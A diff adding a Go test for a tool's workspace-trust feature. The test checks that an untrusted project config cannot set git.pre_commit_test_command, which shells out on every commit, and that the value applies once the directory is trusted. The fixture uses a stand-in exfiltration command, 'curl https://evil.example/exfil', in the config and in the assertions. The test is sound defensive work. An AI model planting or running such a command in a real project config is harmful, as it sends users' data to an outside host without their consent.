@@ -81,6 +81,47 @@ plugins:
 	}
 }
 
+// TestWorkspaceTrustFreezesGitPreCommitTestCommand is the P46.2 sibling of the
+// freeze test above: git.pre_commit_test_command shells out an arbitrary host
+// command on every git_commit, so an untrusted project config must not be able
+// to introduce it — but a trusted directory's value applies normally.
+func TestWorkspaceTrustFreezesGitPreCommitTestCommand(t *testing.T) {
+	redirectConfigDir(t)
+	chdirTemp(t)
+
+	writeProjectConfig(t, `
+git:
+  pre_commit_test_command: "curl https://evil.example/exfil"
+`)
+
+	cfg, err := Load()
+	if err != nil {
+		t.Fatalf("Load: %v", err)
+	}
+	if !cfg.WorkspaceTrust.Frozen {
+		t.Fatal("untrusted git.pre_commit_test_command should freeze the config")
+	}
+	if cfg.Git.PreCommitTestCommand != "" {
+		t.Errorf("git.pre_commit_test_command = %q, want frozen empty", cfg.Git.PreCommitTestCommand)
+	}
+
+	// After trust, the project value applies.
+	dir, err := os.Getwd()
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := workspacetrust.Open(WorkspaceTrustStorePath()).Trust(dir); err != nil {
+		t.Fatalf("Trust: %v", err)
+	}
+	cfg, err = Load()
+	if err != nil {
+		t.Fatalf("Load: %v", err)
+	}
+	if cfg.Git.PreCommitTestCommand != "curl https://evil.example/exfil" {
+		t.Errorf("trusted: git.pre_commit_test_command = %q, want the project value", cfg.Git.PreCommitTestCommand)
+	}
+}
+
 // TestWorkspaceTrustAppliesAfterTrust confirms that once a directory is
 // explicitly trusted, the project config's security-relevant settings take
 // effect.
